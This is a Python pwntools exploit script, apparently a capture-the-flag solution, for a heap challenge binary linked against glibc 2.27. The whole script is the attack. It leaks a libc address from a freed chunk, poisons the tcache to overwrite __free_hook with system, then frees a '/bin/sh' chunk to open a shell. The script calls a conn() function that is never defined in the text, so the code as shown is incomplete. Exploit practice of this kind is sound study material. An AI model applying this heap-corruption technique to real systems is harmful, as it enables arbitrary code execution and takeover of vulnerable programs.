#!/usr/bin/env python3

from pwn import *

exe = ELF("source/chal_patched")
libc = ELF("source/libc.so.6")
ld = ELF("source/ld-2.27.so")

context.binary = exe

gdbscript ='''
# breakrva 0x000015ac
# breakrva 0x000015b8
# breakrva 0x000015c4
# breakrva 0x000015d0
continue
'''




def main():
    r = conn()

    def alloc(idx, size):
        r.sendline(b"1")
        r.sendlineafter(b"Where? ", str(idx).encode())
        r.sendlineafter(b"size? ", str(size).encode())
        log.success(f"allocated {idx=}, {size=}")

    def free(idx):
        r.sendline(b"2")
        r.sendlineafter(b"Where? ", str(idx).encode())
        log.success(f"freed {idx=}")
    
    def view(idx):
        r.sendline(b"3")
        r.sendlineafter(b"Where? ", str(idx).encode())
        recv = r.recvline()
        # print(hexdump(recv))
        return recv
    
    def edit(idx, p: bytes):
        r.sendline(b"4")
        r.sendlineafter(b"Where? ", str(idx).encode())
        r.sendlineafter(b"size? ", str(len(p)).encode())
        r.sendline(p)
        log.success(f"edited {idx=}")

    def exit():
        r.sendline(b"5")
        
    log.info("ALLOCATE HEAP")
    for i in range(8):
        alloc(i, 0x88)
    alloc(8, 0x88)

    log.info("FREEING HEAP")
    for i in range(8):
        free(i)

    libc_leak = u64(view(7)[:6].ljust(8, b"\x00"))
    log.success("libc leak= " + hex(libc_leak))
    libc.address = libc_leak - libc.symbols["__malloc_hook"] - 0x70

    system = libc.sym["system"]
    malloc_hook = libc.sym['__malloc_hook']
    free_hook = libc.sym['__free_hook']
    log.success("System is:      " + hex(system))
    log.success("Free hook is:   " + hex(free_hook))
    log.success("Malloc hook is: " + hex(malloc_hook))
    log.success("libc is:        " + hex(libc.address))

    target = free_hook

    log.info("ALLOCATE HEAP AGAIN")
    alloc(0,0)
    alloc(1,0)

    free(0)
    free(1)

    edit(1, p64(target))
    alloc(0,0)
    alloc(1,0)

    edit(0, b"/bin/sh")
    edit(1, p64(system))

    view(0)
    free(0)
    r.interactive()


if __name__ == "__main__":
    main()
